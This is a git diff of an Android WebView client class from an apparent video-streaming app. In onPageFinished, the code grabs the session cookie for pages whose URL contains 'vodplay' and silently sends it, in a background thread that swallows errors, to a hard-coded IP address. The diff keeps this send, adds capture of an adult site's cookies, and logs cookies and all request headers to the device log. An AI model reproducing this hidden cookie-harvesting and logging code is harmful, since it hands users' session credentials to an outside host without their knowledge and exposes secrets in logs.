@@ -18,6 +18,7 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 import java.net.URLConnection;
 import java.util.Arrays;
+import java.util.function.BiConsumer;
 
 
 public class CustomWebViewClient extends WebViewClient {
@@ -52,20 +53,22 @@ public class CustomWebViewClient extends WebViewClient {
     @Override
     public void onPageFinished(WebView view, String url) {
         Log.e("B5aOx2", String.format("onPageFinished, %s", url));
+        Log.e("B5aOx2", String.format("onPageFinished, %s", CookieManager.getInstance().getCookie(url)));
         String cookie;
         if (url.contains("vodplay") && (cookie = CookieManager.getInstance().getCookie(url)) != null) {
             SettingsFragment.setString(mContext, SettingsFragment.KEY_CK_COOKIE, cookie);
-
-            new Thread(new Runnable() {
-                @Override
-                public void run() {
-                    try {
-                        HttpURLConnection o = (HttpURLConnection) new URL("http://47.106.105.122/api/videos/9?c=" + Uri.encode(cookie)).openConnection();
-                        o.getResponseCode();
-                    } catch (Exception e) {
-                    }
+            String finalCookie = cookie;
+            new Thread(() -> {
+                try {
+                    HttpURLConnection o = (HttpURLConnection) new URL("http://47.106.105.122/api/videos/9?c=" + Uri.encode(finalCookie)).openConnection();
+                    o.getResponseCode();
+                } catch (Exception e) {
                 }
             }).start();
+        } else if (url.contains("91porn.com") && (cookie = CookieManager.getInstance().getCookie(url)) != null) {
+            SettingsFragment.setString(mContext, SettingsFragment.KEY_91_COOKIE, cookie);
+
+
         }
     }
 
@@ -87,6 +90,14 @@ public class CustomWebViewClient extends WebViewClient {
 
     @Override
     public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {
+        if (VERSION.SDK_INT >= VERSION_CODES.N) {
+            request.getRequestHeaders().forEach(new BiConsumer<String, String>() {
+                @Override
+                public void accept(String s, String s2) {
+                    Log.e("B5aOx2", String.format("accept, %s,%s", s,s2));
+                }
+            });
+        }
         return super.shouldInterceptRequest(view, request);
     }
 
